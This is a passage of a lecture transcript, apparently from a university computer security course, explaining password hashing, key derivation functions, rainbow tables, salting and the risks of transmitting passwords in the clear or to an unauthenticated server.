going to see how</text_slice>
            </slice>
            <slice>
              <time_slice>2:08</time_slice>
              <text_slice>some of these other
authentication</text_slice>
            </slice>
            <slice>
              <time_slice>2:10</time_slice>
              <text_slice>schemes actually
compared to passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>2:12</time_slice>
              <text_slice>So in [INAUDIBLE]
what is a password?</text_slice>
            </slice>
            <slice>
              <time_slice>2:14</time_slice>
              <text_slice>So a password is a
secret that is shared</text_slice>
            </slice>
            <slice>
              <time_slice>2:26</time_slice>
              <text_slice>between a user and a server.</text_slice>
            </slice>
            <slice>
              <time_slice>2:34</time_slice>
              <text_slice>So the naive implementation
of a password scheme</text_slice>
            </slice>
            <slice>
              <time_slice>2:37</time_slice>
              <text_slice>is to basically
just have a table</text_slice>
            </slice>
            <slice>
              <time_slice>2:41</time_slice>
              <text_slice>on the server side that
essentially just maps</text_slice>
            </slice>
            <slice>
              <time_slice>2:44</time_slice>
              <text_slice>user names to passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>2:50</time_slice>
              <text_slice>That's the simplest
way for you to imagine</text_slice>
            </slice>
            <slice>
              <time_slice>2:52</time_slice>
              <text_slice>implementing one of the
authentication schemes-- user</text_slice>
            </slice>
            <slice>
              <time_slice>2:54</time_slice>
              <text_slice>passes into their user name
and the password, server</text_slice>
            </slice>
            <slice>
              <time_slice>2:58</time_slice>
              <text_slice>network does a look
up in this table,</text_slice>
            </slice>
            <slice>
              <time_slice>2:59</time_slice>
              <text_slice>compares the password
of the client supplied,</text_slice>
            </slice>
            <slice>
              <time_slice>3:01</time_slice>
              <text_slice>what's in here.</text_slice>
            </slice>
            <slice>
              <time_slice>3:02</time_slice>
              <text_slice>If everything's good,
the user's authenticated.</text_slice>
            </slice>
            <slice>
              <time_slice>3:04</time_slice>
              <text_slice>So clearly the
problem with this is</text_slice>
            </slice>
            <slice>
              <time_slice>3:06</time_slice>
              <text_slice>that if the attacker
compromises the server,</text_slice>
            </slice>
            <slice>
              <time_slice>3:09</time_slice>
              <text_slice>then he can just
look at this table</text_slice>
            </slice>
            <slice>
              <time_slice>3:10</time_slice>
              <text_slice>and then get all the uses
passwords in the queue.</text_slice>
            </slice>
            <slice>
              <time_slice>3:13</time_slice>
              <text_slice>So that's clearly a bad thing.</text_slice>
            </slice>
            <slice>
              <time_slice>3:15</time_slice>
              <text_slice>So perhaps an
improved solution is</text_slice>
            </slice>
            <slice>
              <time_slice>3:19</time_slice>
              <text_slice>to have the server store
a table that looks like.</text_slice>
            </slice>
            <slice>
              <time_slice>3:23</time_slice>
              <text_slice>So once again, it'd
match the user name</text_slice>
            </slice>
            <slice>
              <time_slice>3:25</time_slice>
              <text_slice>but now it actually match
to hash of the password.</text_slice>
            </slice>
            <slice>
              <time_slice>3:34</time_slice>
              <text_slice>So user client's gonna
supply their clear text</text_slice>
            </slice>
            <slice>
              <time_slice>3:37</time_slice>
              <text_slice>password to the
server, the server</text_slice>
            </slice>
            <slice>
              <time_slice>3:39</time_slice>
              <text_slice>will then take that
clear text password,</text_slice>
            </slice>
            <slice>
              <time_slice>3:41</time_slice>
              <text_slice>hash it, do look at the
table, and once again see</text_slice>
            </slice>
            <slice>
              <time_slice>3:43</time_slice>
              <text_slice>if the user is who he or
she says that they are.</text_slice>
            </slice>
            <slice>
              <time_slice>3:46</time_slice>
              <text_slice>So the advantage
of this scheme is</text_slice>
            </slice>
            <slice>
              <time_slice>3:49</time_slice>
              <text_slice>that by designed
these hash functions</text_slice>
            </slice>
            <slice>
              <time_slice>3:52</time_slice>
              <text_slice>are difficult to invert.</text_slice>
            </slice>
            <slice>
              <time_slice>3:54</time_slice>
              <text_slice>So if this table is
lost, it's leaked somehow</text_slice>
            </slice>
            <slice>
              <time_slice>3:57</time_slice>
              <text_slice>or the attacker
compromised the server,</text_slice>
            </slice>
            <slice>
              <time_slice>3:58</time_slice>
              <text_slice>and the attacker could
look at these things here,</text_slice>
            </slice>
            <slice>
              <time_slice>4:00</time_slice>
              <text_slice>but it's difficult
for the attackers</text_slice>
            </slice>
            <slice>
              <time_slice>4:03</time_slice>
              <text_slice>to say, OK, this sort of
string of random alpha</text_slice>
            </slice>
            <slice>
              <time_slice>4:05</time_slice>
              <text_slice>numeric characters here.</text_slice>
            </slice>
            <slice>
              <time_slice>4:07</time_slice>
              <text_slice>Here's a pre-image that
was used as the input</text_slice>
            </slice>
            <slice>
              <time_slice>4:10</time_slice>
              <text_slice>of the hast function
[INAUDIBLE] that value there.</text_slice>
            </slice>
            <slice>
              <time_slice>4:13</time_slice>
              <text_slice>So that at least
is the nice thing</text_slice>
            </slice>
            <slice>
              <time_slice>4:16</time_slice>
              <text_slice>about these hashes in theory.</text_slice>
            </slice>
            <slice>
              <time_slice>4:18</time_slice>
              <text_slice>Now in practice,
attackers don't actually</text_slice>
            </slice>
            <slice>
              <time_slice>4:21</time_slice>
              <text_slice>have to launch
brute force attacks</text_slice>
            </slice>
            <slice>
              <time_slice>4:23</time_slice>
              <text_slice>to figure out what the preimages
for these hash values are.</text_slice>
            </slice>
            <slice>
              <time_slice>4:28</time_slice>
              <text_slice>So attackers can actually
take advantage of the fact</text_slice>
            </slice>
            <slice>
              <time_slice>4:30</time_slice>
              <text_slice>that passwords in practice
have skewed distribution.</text_slice>
            </slice>
            <slice>
              <time_slice>4:40</time_slice>
              <text_slice>And by skewed
distributions, I mean</text_slice>
            </slice>
            <slice>
              <time_slice>4:43</time_slice>
              <text_slice>that-- let's say that we
knew that all passwords were</text_slice>
            </slice>
            <slice>
              <time_slice>4:45</time_slice>
              <text_slice>20 characters long.</text_slice>
            </slice>
            <slice>
              <time_slice>4:47</time_slice>
              <text_slice>It's not like users actually
pick passwords that's</text_slice>
            </slice>
            <slice>
              <time_slice>4:50</time_slice>
              <text_slice>sort of exist in all
places in that space of 20</text_slice>
            </slice>
            <slice>
              <time_slice>4:54</time_slice>
              <text_slice>possible characters.</text_slice>
            </slice>
            <slice>
              <time_slice>4:55</time_slice>
              <text_slice>In practice, people pick
passwords like 1, 2, 3 or todd</text_slice>
            </slice>
            <slice>
              <time_slice>5:00</time_slice>
              <text_slice>or things like this.</text_slice>
            </slice>
            <slice>
              <time_slice>5:02</time_slice>
              <text_slice>So in fact there's been
these empirical studies</text_slice>
            </slice>
            <slice>
              <time_slice>5:03</time_slice>
              <text_slice>of how passwords work
and a lot of times</text_slice>
            </slice>
            <slice>
              <time_slice>5:08</time_slice>
              <text_slice>these studies find things
like the top 5,000 passwords</text_slice>
            </slice>
            <slice>
              <time_slice>5:18</time_slice>
              <text_slice>cover about 20% of users.</text_slice>
            </slice>
            <slice>
              <time_slice>5:25</time_slice>
              <text_slice>So what that means,
in other words,</text_slice>
            </slice>
            <slice>
              <time_slice>5:26</time_slice>
              <text_slice>is that the attacker has
a database of those 5,000</text_slice>
            </slice>
            <slice>
              <time_slice>5:29</time_slice>
              <text_slice>passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>5:30</time_slice>
              <text_slice>The attacker can
just hash those,</text_slice>
            </slice>
            <slice>
              <time_slice>5:32</time_slice>
              <text_slice>and then when the attacker looks
at this stolen password table,</text_slice>
            </slice>
            <slice>
              <time_slice>5:37</time_slice>
              <text_slice>can just see if one
of those things that</text_slice>
            </slice>
            <slice>
              <time_slice>5:39</time_slice>
              <text_slice>come from this 5,000 large
list match over here.</text_slice>
            </slice>
            <slice>
              <time_slice>5:44</time_slice>
              <text_slice>And so empirically
speaking, the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>5:46</time_slice>
              <text_slice>would be able to recover about
20% of passwords that way.</text_slice>
            </slice>
            <slice>
              <time_slice>5:49</time_slice>
              <text_slice>And so, folks at Yahoo
found that passwords</text_slice>
            </slice>
            <slice>
              <time_slice>5:55</time_slice>
              <text_slice>have roughly 10 to 20 bits
of intricate, 10 to 20 bits</text_slice>
            </slice>
            <slice>
              <time_slice>6:02</time_slice>
              <text_slice>of randomness in them.</text_slice>
            </slice>
            <slice>
              <time_slice>6:04</time_slice>
              <text_slice>And that's actually
not that big.</text_slice>
            </slice>
            <slice>
              <time_slice>6:08</time_slice>
              <text_slice>So, for example, if you
think about what might</text_slice>
            </slice>
            <slice>
              <time_slice>6:10</time_slice>
              <text_slice>this hash function here be?</text_slice>
            </slice>
            <slice>
              <time_slice>6:11</time_slice>
              <text_slice>So maybe it's something like
shop, something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>6:14</time_slice>
              <text_slice>So modern machines
actually calculate millions</text_slice>
            </slice>
            <slice>
              <time_slice>6:17</time_slice>
              <text_slice>of these hashes every second.</text_slice>
            </slice>
            <slice>
              <time_slice>6:20</time_slice>
              <text_slice>So the fact that hash
function by design</text_slice>
            </slice>
            <slice>
              <time_slice>6:22</time_slice>
              <text_slice>are suppose to be
easy to calculate</text_slice>
            </slice>
            <slice>
              <time_slice>6:25</time_slice>
              <text_slice>so it'd be fast calculate.</text_slice>
            </slice>
            <slice>
              <time_slice>6:26</time_slice>
              <text_slice>Combined with this
fact that there'd</text_slice>
            </slice>
            <slice>
              <time_slice>6:27</time_slice>
              <text_slice>be skewed password
distributions,</text_slice>
            </slice>
            <slice>
              <time_slice>6:29</time_slice>
              <text_slice>means that in principle, this
scheme here is not as secure</text_slice>
            </slice>
            <slice>
              <time_slice>6:32</time_slice>
              <text_slice>as it might seem.</text_slice>
            </slice>
            <slice>
              <time_slice>6:34</time_slice>
              <text_slice>So one thing you
can imagine to try</text_slice>
            </slice>
            <slice>
              <time_slice>6:36</time_slice>
              <text_slice>to make life more
difficult on the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>6:40</time_slice>
              <text_slice>is you could imagine that you
use expensive key derivation</text_slice>
            </slice>
            <slice>
              <time_slice>6:46</time_slice>
              <text_slice>function.</text_slice>
            </slice>
            <slice>
              <time_slice>6:53</time_slice>
              <text_slice>And so by key
derivation function,</text_slice>
            </slice>
            <slice>
              <time_slice>6:55</time_slice>
              <text_slice>I just mean this thing up here.</text_slice>
            </slice>
            <slice>
              <time_slice>6:58</time_slice>
              <text_slice>This thing that's taking the
passwords as input and then</text_slice>
            </slice>
            <slice>
              <time_slice>7:01</time_slice>
              <text_slice>generate something that's
stored on the server.</text_slice>
            </slice>
            <slice>
              <time_slice>7:03</time_slice>
              <text_slice>So what's nice about
these key derivation</text_slice>
            </slice>
            <slice>
              <time_slice>7:05</time_slice>
              <text_slice>functions is it actually
have tunable cost.</text_slice>
            </slice>
            <slice>
              <time_slice>7:09</time_slice>
              <text_slice>So you can basically
turn this knob</text_slice>
            </slice>
            <slice>
              <time_slice>7:11</time_slice>
              <text_slice>and make that function
run slower or faster</text_slice>
            </slice>
            <slice>
              <time_slice>7:14</time_slice>
              <text_slice>depending on what you want.</text_slice>
            </slice>
            <slice>
              <time_slice>7:15</time_slice>
              <text_slice>And so the idea here
is that, let's say</text_slice>
            </slice>
            <slice>
              <time_slice>7:17</time_slice>
              <text_slice>that you're going to use
a key derivation function.</text_slice>
            </slice>
            <slice>
              <time_slice>7:19</time_slice>
              <text_slice>So assume these examples are
like PBKDF2, or maybe BCrypt</text_slice>
            </slice>
            <slice>
              <time_slice>7:28</time_slice>
              <text_slice>so you can look these up using
the miracle of the internet</text_slice>
            </slice>
            <slice>
              <time_slice>7:30</time_slice>
              <text_slice>if you care to know
more about them.</text_slice>
            </slice>
            <slice>
              <time_slice>7:32</time_slice>
              <text_slice>But the base idea
is let's imagine</text_slice>
            </slice>
            <slice>
              <time_slice>7:34</time_slice>
              <text_slice>that one of these key
derivation function</text_slice>
            </slice>
            <slice>
              <time_slice>7:36</time_slice>
              <text_slice>took a second to calculate, as
opposed to a few milliseconds.</text_slice>
            </slice>
            <slice>
              <time_slice>7:40</time_slice>
              <text_slice>That actually makes
the attacker's job</text_slice>
            </slice>
            <slice>
              <time_slice>7:42</time_slice>
              <text_slice>much more difficult. Because
when the attacker is trying</text_slice>
            </slice>
            <slice>
              <time_slice>7:45</time_slice>
              <text_slice>to, let's say, generate
values for these 5,000 topmost</text_slice>
            </slice>
            <slice>
              <time_slice>7:49</time_slice>
              <text_slice>passwords, it's going to
take the attacker much longer</text_slice>
            </slice>
            <slice>
              <time_slice>7:51</time_slice>
              <text_slice>to do that.</text_slice>
            </slice>
            <slice>
              <time_slice>7:52</time_slice>
              <text_slice>So does that all makes
sense how these things work?</text_slice>
            </slice>
            <slice>
              <time_slice>7:55</time_slice>
              <text_slice>Pretty straight forward.</text_slice>
            </slice>
            <slice>
              <time_slice>7:56</time_slice>
              <text_slice>So internally these key
derivation functions</text_slice>
            </slice>
            <slice>
              <time_slice>7:59</time_slice>
              <text_slice>often operate by repeatedly
calling a hash multiple,</text_slice>
            </slice>
            <slice>
              <time_slice>8:02</time_slice>
              <text_slice>multiple times.</text_slice>
            </slice>
            <slice>
              <time_slice>8:03</time_slice>
              <text_slice>So that's all pretty
straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>8:05</time_slice>
              <text_slice>So you might say, well,
does this solve the problem?</text_slice>
            </slice>
            <slice>
              <time_slice>8:08</time_slice>
              <text_slice>So can we just use these
expensive key derivation</text_slice>
            </slice>
            <slice>
              <time_slice>8:10</time_slice>
              <text_slice>function and be done with it?</text_slice>
            </slice>
            <slice>
              <time_slice>8:12</time_slice>
              <text_slice>So if this was a security
class, the answer is no.</text_slice>
            </slice>
            <slice>
              <time_slice>8:14</time_slice>
              <text_slice>So one problem is that the
adversary can build something</text_slice>
            </slice>
            <slice>
              <time_slice>8:17</time_slice>
              <text_slice>called rainbow tables.</text_slice>
            </slice>
            <slice>
              <time_slice>8:23</time_slice>
              <text_slice>And so a rainbow table
is basically just a map</text_slice>
            </slice>
            <slice>
              <time_slice>8:29</time_slice>
              <text_slice>of a password to hash out.</text_slice>
            </slice>
            <slice>
              <time_slice>8:39</time_slice>
              <text_slice>And so the insight here is that
even if the system is using</text_slice>
            </slice>
            <slice>
              <time_slice>8:43</time_slice>
              <text_slice>one of these expensive
key derivation function,</text_slice>
            </slice>
            <slice>
              <time_slice>8:45</time_slice>
              <text_slice>the attacker can calculate
one of these tables once.</text_slice>
            </slice>
            <slice>
              <time_slice>8:49</time_slice>
              <text_slice>It might be a little bit painful
because each key derivation</text_slice>
            </slice>
            <slice>
              <time_slice>8:52</time_slice>
              <text_slice>function indication is slow.</text_slice>
            </slice>
            <slice>
              <time_slice>8:53</time_slice>
              <text_slice>But the attacker can build
this table once and then use</text_slice>
            </slice>
            <slice>
              <time_slice>8:56</time_slice>
              <text_slice>that to crack all subsequent
systems the attacker can</text_slice>
            </slice>
            <slice>
              <time_slice>9:00</time_slice>
              <text_slice>break into that use that
same key derivation function.</text_slice>
            </slice>
            <slice>
              <time_slice>9:04</time_slice>
              <text_slice>So that's how
rainbow tables work.</text_slice>
            </slice>
            <slice>
              <time_slice>9:05</time_slice>
              <text_slice>And once again, to
maximize the cost benefit</text_slice>
            </slice>
            <slice>
              <time_slice>9:07</time_slice>
              <text_slice>of building this rainbow
table, the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>9:09</time_slice>
              <text_slice>could take advantage of the
skewed password distributions</text_slice>
            </slice>
            <slice>
              <time_slice>9:12</time_slice>
              <text_slice>I can see up here.</text_slice>
            </slice>
            <slice>
              <time_slice>9:13</time_slice>
              <text_slice>So the attacker might
only build a rainbow table</text_slice>
            </slice>
            <slice>
              <time_slice>9:15</time_slice>
              <text_slice>for some small set of
all possible passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>9:17</time_slice>
              <text_slice>AUDIENCE: So salting makes
this much more difficult.</text_slice>
            </slice>
            <slice>
              <time_slice>9:19</time_slice>
              <text_slice>PROFESSOR: Yeah,
yeah, that's right.</text_slice>
            </slice>
            <slice>
              <time_slice>9:21</time_slice>
              <text_slice>So we're going to get to salting
I believe in a couple seconds.</text_slice>
            </slice>
            <slice>
              <time_slice>9:24</time_slice>
              <text_slice>That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>9:24</time_slice>
              <text_slice>So at a high level, if
you don't use salting,</text_slice>
            </slice>
            <slice>
              <time_slice>9:27</time_slice>
              <text_slice>rainbow tables actually
allow the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>9:29</time_slice>
              <text_slice>to spend some effort offline,
calculate this table,</text_slice>
            </slice>
            <slice>
              <time_slice>9:32</time_slice>
              <text_slice>and then sort of
amortized the cost</text_slice>
            </slice>
            <slice>
              <time_slice>9:34</time_slice>
              <text_slice>of calculating that
table over breaking</text_slice>
            </slice>
            <slice>
              <time_slice>9:36</time_slice>
              <text_slice>many different
password databases.</text_slice>
            </slice>
            <slice>
              <time_slice>9:41</time_slice>
              <text_slice>So the next thing that we can
think about to improve things</text_slice>
            </slice>
            <slice>
              <time_slice>9:44</time_slice>
              <text_slice>is salting.</text_slice>
            </slice>
            <slice>
              <time_slice>9:45</time_slice>
              <text_slice>I swear that guy
was not a plant,</text_slice>
            </slice>
            <slice>
              <time_slice>9:46</time_slice>
              <text_slice>I will give you your
$20 after class.</text_slice>
            </slice>
            <slice>
              <time_slice>9:49</time_slice>
              <text_slice>So how does salting work?</text_slice>
            </slice>
            <slice>
              <time_slice>9:50</time_slice>
              <text_slice>So the basic thing
is you just want</text_slice>
            </slice>
            <slice>
              <time_slice>9:52</time_slice>
              <text_slice>input some additional
randomness into the way</text_slice>
            </slice>
            <slice>
              <time_slice>9:54</time_slice>
              <text_slice>that the passwords generated.</text_slice>
            </slice>
            <slice>
              <time_slice>9:56</time_slice>
              <text_slice>So basically, you want to
take this hash function</text_slice>
            </slice>
            <slice>
              <time_slice>10:02</time_slice>
              <text_slice>and you want to put some
salt in there-- which</text_slice>
            </slice>
            <slice>
              <time_slice>10:05</time_slice>
              <text_slice>I'll explain in a second--
and then the password.</text_slice>
            </slice>
            <slice>
              <time_slice>10:08</time_slice>
              <text_slice>And this is the thing that
you saw on the server side</text_slice>
            </slice>
            <slice>
              <time_slice>10:10</time_slice>
              <text_slice>in the [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>10:11</time_slice>
              <text_slice>So what is this salt?</text_slice>
            </slice>
            <slice>
              <time_slice>10:12</time_slice>
              <text_slice>And you just think of it as just
a string, a long string that's</text_slice>
            </slice>
            <slice>
              <time_slice>10:16</time_slice>
              <text_slice>provided as sort of a first
part to this hash function.</text_slice>
            </slice>
            <slice>
              <time_slice>10:20</time_slice>
              <text_slice>So why is it better
to use this scheme?</text_slice>
            </slice>
            <slice>
              <time_slice>10:23</time_slice>
              <text_slice>And know that the
salt is actually</text_slice>
            </slice>
            <slice>
              <time_slice>10:25</time_slice>
              <text_slice>stored on the clear
text on the server side.</text_slice>
            </slice>
            <slice>
              <time_slice>10:28</time_slice>
              <text_slice>So you might be thinking OK,
well if that salt is stored</text_slice>
            </slice>
            <slice>
              <time_slice>10:30</time_slice>
              <text_slice>on the clear text
in the server side,</text_slice>
            </slice>
            <slice>
              <time_slice>10:32</time_slice>
              <text_slice>it seemed like a server can both
steal the table that matched</text_slice>
            </slice>
            <slice>
              <time_slice>10:36</time_slice>
              <text_slice>user names to passwords
and the attacker can also</text_slice>
            </slice>
            <slice>
              <time_slice>10:38</time_slice>
              <text_slice>steal the salt. So
why is that useful?</text_slice>
            </slice>
            <slice>
              <time_slice>10:41</time_slice>
              <text_slice>AUDIENCE: Because if you picked
the top most common password,</text_slice>
            </slice>
            <slice>
              <time_slice>10:43</time_slice>
              <text_slice>you can't just use it
once and find a new user.</text_slice>
            </slice>
            <slice>
              <time_slice>10:46</time_slice>
              <text_slice>PROFESSOR: That's exactly right.</text_slice>
            </slice>
            <slice>
              <time_slice>10:47</time_slice>
              <text_slice>So basically what
this does is this</text_slice>
            </slice>
            <slice>
              <time_slice>10:49</time_slice>
              <text_slice>prevents the attacker from
building a single rainbow table</text_slice>
            </slice>
            <slice>
              <time_slice>10:52</time_slice>
              <text_slice>and then using that rainbow
table against all instances</text_slice>
            </slice>
            <slice>
              <time_slice>10:56</time_slice>
              <text_slice>of that hash function.</text_slice>
            </slice>
            <slice>
              <time_slice>10:57</time_slice>
              <text_slice>And so you can
basically think of this</text_slice>
            </slice>
            <slice>
              <time_slice>10:59</time_slice>
              <text_slice>as sort of uniquifying
passwords even if they</text_slice>
            </slice>
            <slice>
              <time_slice>11:02</time_slice>
              <text_slice>are the same, basically.</text_slice>
            </slice>
            <slice>
              <time_slice>11:04</time_slice>
              <text_slice>So this is what a lot of
systems do in practice, they</text_slice>
            </slice>
            <slice>
              <time_slice>11:07</time_slice>
              <text_slice>use this notion of salt here.</text_slice>
            </slice>
            <slice>
              <time_slice>11:09</time_slice>
              <text_slice>And so the best
practices for this</text_slice>
            </slice>
            <slice>
              <time_slice>11:10</time_slice>
              <text_slice>so you want to
choose a salt that's</text_slice>
            </slice>
            <slice>
              <time_slice>11:12</time_slice>
              <text_slice>long Because you're going to
essentially think of the salt</text_slice>
            </slice>
            <slice>
              <time_slice>11:14</time_slice>
              <text_slice>as adding more bits to
this pseudo-password right.</text_slice>
            </slice>
            <slice>
              <time_slice>11:18</time_slice>
              <text_slice>So more bits is always better.</text_slice>
            </slice>
            <slice>
              <time_slice>11:19</time_slice>
              <text_slice>And the other thing
you want to do to</text_slice>
            </slice>
            <slice>
              <time_slice>11:21</time_slice>
              <text_slice>is that whenever the user
changes his or her password,</text_slice>
            </slice>
            <slice>
              <time_slice>11:23</time_slice>
              <text_slice>you typically want to
change that salt too.</text_slice>
            </slice>
            <slice>
              <time_slice>11:25</time_slice>
              <text_slice>So one reason for that is
let's say that users are lazy</text_slice>
            </slice>
            <slice>
              <time_slice>11:29</time_slice>
              <text_slice>and they want to pick the
same password multiple times.</text_slice>
            </slice>
            <slice>
              <time_slice>11:31</time_slice>
              <text_slice>Changing the salt will
ensure that the thing that's</text_slice>
            </slice>
            <slice>
              <time_slice>11:34</time_slice>
              <text_slice>stored in the password database
will actually be different even</text_slice>
            </slice>
            <slice>
              <time_slice>11:37</time_slice>
              <text_slice>it that password's the same.</text_slice>
            </slice>
            <slice>
              <time_slice>11:38</time_slice>
              <text_slice>I think there was a
questions somewhere.</text_slice>
            </slice>
            <slice>
              <time_slice>11:40</time_slice>
              <text_slice>AUDIENCE: Why's it called salt?</text_slice>
            </slice>
            <slice>
              <time_slice>11:41</time_slice>
              <text_slice>PROFESSOR: I'm actually
not sure why it's called</text_slice>
            </slice>
            <slice>
              <time_slice>11:43</time_slice>
              <text_slice>salt, that's a good question.</text_slice>
            </slice>
            <slice>
              <time_slice>11:45</time_slice>
              <text_slice>I'm sure there's some
answer to this though.</text_slice>
            </slice>
            <slice>
              <time_slice>11:46</time_slice>
              <text_slice>It's like why are
cookies called cookies?</text_slice>
            </slice>
            <slice>
              <time_slice>11:47</time_slice>
              <text_slice>The internet will know
but I actually don't know.</text_slice>
            </slice>
            <slice>
              <time_slice>11:49</time_slice>
              <text_slice>AUDIENCE: Add some
[INAUDIBLE] to the hash number</text_slice>
            </slice>
            <slice>
              <time_slice>11:52</time_slice>
              <text_slice>hash [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>11:55</time_slice>
              <text_slice>PROFESSOR: There we go.</text_slice>
            </slice>
            <slice>
              <time_slice>11:56</time_slice>
              <text_slice>I'm glad that we're
getting this on film,</text_slice>
            </slice>
            <slice>
              <time_slice>11:58</time_slice>
              <text_slice>cause I feel this
how we're going</text_slice>
            </slice>
            <slice>
              <time_slice>11:59</time_slice>
              <text_slice>to get our Touring awards.</text_slice>
            </slice>
            <slice>
              <time_slice>12:00</time_slice>
              <text_slice>That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>12:01</time_slice>
              <text_slice>I'm sure there's some
answer on the internet,</text_slice>
            </slice>
            <slice>
              <time_slice>12:03</time_slice>
              <text_slice>so I'll look that up later.</text_slice>
            </slice>
            <slice>
              <time_slice>12:05</time_slice>
              <text_slice>But does that all
basically makes sense?</text_slice>
            </slice>
            <slice>
              <time_slice>12:08</time_slice>
              <text_slice>OK so these approaches are
fairly straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>12:12</time_slice>
              <text_slice>So what I've assume so far
is that somehow the client</text_slice>
            </slice>
            <slice>
              <time_slice>12:16</time_slice>
              <text_slice>is transmitting the
password to the server.</text_slice>
            </slice>
            <slice>
              <time_slice>12:20</time_slice>
              <text_slice>But I haven't actually specified
how that transition's actually</text_slice>
            </slice>
            <slice>
              <time_slice>12:23</time_slice>
              <text_slice>going to take place.</text_slice>
            </slice>
            <slice>
              <time_slice>12:27</time_slice>
              <text_slice>So how do we transmit
these passwords?</text_slice>
            </slice>
            <slice>
              <time_slice>12:35</time_slice>
              <text_slice>So the first idea you
might have would be,</text_slice>
            </slice>
            <slice>
              <time_slice>12:39</time_slice>
              <text_slice>well, we'll just
send the password</text_slice>
            </slice>
            <slice>
              <time_slice>12:43</time_slice>
              <text_slice>in the clear over the network.</text_slice>
            </slice>
            <slice>
              <time_slice>12:46</time_slice>
              <text_slice>This is clearly
cartoonishly bad,</text_slice>
            </slice>
            <slice>
              <time_slice>12:49</time_slice>
              <text_slice>because then there could
be a network attacker who's</text_slice>
            </slice>
            <slice>
              <time_slice>12:51</time_slice>
              <text_slice>basically snooping
and seeing the traffic</text_slice>
            </slice>
            <slice>
              <time_slice>12:54</time_slice>
              <text_slice>that you're sending.</text_slice>
            </slice>
            <slice>
              <time_slice>12:54</time_slice>
              <text_slice>And let's see if we can
just take that password</text_slice>
            </slice>
            <slice>
              <time_slice>12:56</time_slice>
              <text_slice>right off the wire and
then impersonate you.</text_slice>
            </slice>
            <slice>
              <time_slice>12:59</time_slice>
              <text_slice>So we always start
with the straw man</text_slice>
            </slice>
            <slice>
              <time_slice>13:00</time_slice>
              <text_slice>before I show you the other
straw men, which of course are</text_slice>
            </slice>
            <slice>
              <time_slice>13:02</time_slice>
              <text_slice>also fatally flawed.</text_slice>
            </slice>
            <slice>
              <time_slice>13:03</time_slice>
              <text_slice>So first thing you
think about is sending</text_slice>
            </slice>
            <slice>
              <time_slice>13:05</time_slice>
              <text_slice>a password in the clear.</text_slice>
            </slice>
            <slice>
              <time_slice>13:07</time_slice>
              <text_slice>Another thing you
might think, which</text_slice>
            </slice>
            <slice>
              <time_slice>13:08</time_slice>
              <text_slice>would be a little
bit better perhaps,</text_slice>
            </slice>
            <slice>
              <time_slice>13:10</time_slice>
              <text_slice>is perhaps we send the password
over an encrypted connection.</text_slice>
            </slice>
            <slice>
              <time_slice>13:23</time_slice>
              <text_slice>And so we use some type
of cryptography here.</text_slice>
            </slice>
            <slice>
              <time_slice>13:27</time_slice>
              <text_slice>Maybe there's some secret
key or something like that</text_slice>
            </slice>
            <slice>
              <time_slice>13:29</time_slice>
              <text_slice>and that's what we
use to transform</text_slice>
            </slice>
            <slice>
              <time_slice>13:31</time_slice>
              <text_slice>the password before we send
it over the connection.</text_slice>
            </slice>
            <slice>
              <time_slice>13:34</time_slice>
              <text_slice>So at a high level,
encryption always</text_slice>
            </slice>
            <slice>
              <time_slice>13:35</time_slice>
              <text_slice>seems to make things
better, right?</text_slice>
            </slice>
            <slice>
              <time_slice>13:37</time_slice>
              <text_slice>Trademark.</text_slice>
            </slice>
            <slice>
              <time_slice>13:38</time_slice>
              <text_slice>But the problem is that
unless you think carefully</text_slice>
            </slice>
            <slice>
              <time_slice>13:41</time_slice>
              <text_slice>about how you're using things
like encryption and hashing,</text_slice>
            </slice>
            <slice>
              <time_slice>13:43</time_slice>
              <text_slice>you may not be getting
the security benefits</text_slice>
            </slice>
            <slice>
              <time_slice>13:45</time_slice>
              <text_slice>that you think you're getting.</text_slice>
            </slice>
            <slice>
              <time_slice>13:46</time_slice>
              <text_slice>Because, for example,
what if there's</text_slice>
            </slice>
            <slice>
              <time_slice>13:48</time_slice>
              <text_slice>someone who's sitting
between you-- the client--</text_slice>
            </slice>
            <slice>
              <time_slice>13:50</time_slice>
              <text_slice>and the server, this proverbial
man in the middle attacker,</text_slice>
            </slice>
            <slice>
              <time_slice>13:53</time_slice>
              <text_slice>who's actually snooping
on your traffic</text_slice>
            </slice>
            <slice>
              <time_slice>13:55</time_slice>
              <text_slice>and pretending to be the server.</text_slice>
            </slice>
            <slice>
              <time_slice>13:57</time_slice>
              <text_slice>If you send encrypted
data, you haven't actually</text_slice>
            </slice>
            <slice>
              <time_slice>14:00</time_slice>
              <text_slice>authenticated the
other end, then</text_slice>
            </slice>
            <slice>
              <time_slice>14:02</time_slice>
              <text_slice>you could still be opening
up yourself to problems.</text_slice>
            </slice>
            <slice>
              <time_slice>14:06</time_slice>
              <text_slice>Because if the client
just, let's say,</text_slice>
            </slice>
            <slice>
              <time_slice>14:07</time_slice>
              <text_slice>picked some random key,
sends it to some entity</text_slice>
            </slice>
            <slice>
              <time_slice>14:10</time_slice>
              <text_slice>on the other side who may
or may not be the server.</text_slice>
            </slice>
            <slice>
              <time_slice>14:12</time_slice>
              <text_slice>It is not the
server, [INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>14:15</time_slice>
              <text_slice>You are sending something to
some person, who will then be</text_slice>
            </slice>
            <slice>
              <time_slice>14:19</time_slice>
              <text_slice>able to get all your secrets.</text_slice>
            </slice>
            <slice>
              <time_slice>14:21</time_slice>
              <text_slice>And so similarly,
people might think well</text_slice>
            </slice>
            <slice>
              <time_slice>14:23</time_slice>
              <text_slice>what if I don't send
the raw password</text_slice>
            </slice>
            <slice>
              <time_slice>14:25</time_slice>
              <text_slice>but I send a hash
of the passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>14:27</time_slice>
              <text_slice>That actually doesn't
give you anything</text_slice>
            </slice>
            <slice>
              <time_slice>14:29</time_slice>
              <text_slice>in and of itself either.</text_slice>
            </slice>
